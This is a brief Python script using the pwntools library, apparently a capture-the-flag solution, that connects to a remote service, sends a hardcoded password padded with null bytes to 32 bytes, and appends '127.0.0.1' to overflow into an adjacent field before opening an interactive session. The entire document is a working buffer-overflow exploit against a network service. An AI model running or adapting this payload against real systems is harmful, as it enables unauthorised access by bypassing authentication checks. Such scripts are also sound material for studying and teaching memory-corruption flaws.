from pwn import *
p = remote('fsi.zzado.kr',7773)
data = p.recvuntil(b"Enter password :")
print(data)
payload = b'PaS5w03d'
payload += b'\x00'* (0x20 - len(payload))
payload += b'127.0.0.1'
print(payload)
p.sendline(payload)
p.interactive();